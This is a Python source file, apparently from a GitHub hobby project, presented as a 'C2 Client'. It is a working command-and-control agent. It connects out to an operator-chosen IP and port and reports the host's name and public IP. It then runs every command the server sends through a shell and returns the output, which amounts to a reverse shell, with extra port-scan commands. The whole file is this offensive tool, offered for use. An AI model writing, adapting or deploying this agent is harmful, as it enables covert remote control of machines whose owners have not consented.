# ==================================================================================================================== #
# Version 1.3.0 of my C2 Client!                                                                                       #
# Made by Eric E. Github: https://github.com/EricEsquivel                                                              #
# ==================================================================================================================== #

import socket, requests, sys, subprocess, re, argparse
try:
    import hostportscanner
    hpsimported = True
except ImportError as importerror:
    hpsimported = False
    print(f"Error: {importerror}")


def send_to_server(stuffhere):
    stuffhere = stuffhere.encode("utf-8")
    s.send(stuffhere)

# Run checks with argparse #
ap = argparse.ArgumentParser(description=f"Example: {sys.argv[0]} 127.0.0.1 4444")
ap.add_argument("connectip", help="Enter IP address to connect to", type=str)
ap.add_argument("connectport", help="Enter port to connect to", type=int)
parseargs = ap.parse_args()
cmdserver_ip = parseargs.connectip
cmdserver_port = parseargs.connectport

# Final Check #
serveraddress = (cmdserver_ip,cmdserver_port)
s = socket.socket()
try:
    s.connect((serveraddress))
except Exception as er:
    er = re.sub(r"\[.+\]", "", str(er)).strip()
    print(er)
    sys.exit()
# ------------------------------------#

hostname = (socket.gethostname())
public_ip = requests.get('https://api.ipify.org').text
client_send = (f"Client {hostname}, {public_ip} joined.").encode("utf-8")
s.send(client_send)
while True:
    command = s.recv(1024).decode("utf-8")
    if command == "stopall":
        break
    elif command == "portscan" and hpsimported == True:
        send_to_server("Initiating port scan. This will take a minute.")
        hostportscanner.main()
        open_ports = str(hostportscanner.open_ports)
        time_passed = str(hostportscanner.timepassed)
        send_to_server(f"Client {hostname}, {public_ip} has open ports: {open_ports}. Process took {time_passed}s.")
    elif command == "openports" and hpsimported == True:
        try:
            send_to_server(f"{hostname}, {public_ip} has open ports: {open_ports}")
        except NameError:
            send_to_server("Run port scan before running this command!")
    else:
        output = subprocess.getoutput(command)
        send_to_server(f"{hostname}, {public_ip}: {output}")
    
print("Stop device initiated. Disconnecting")
s.close()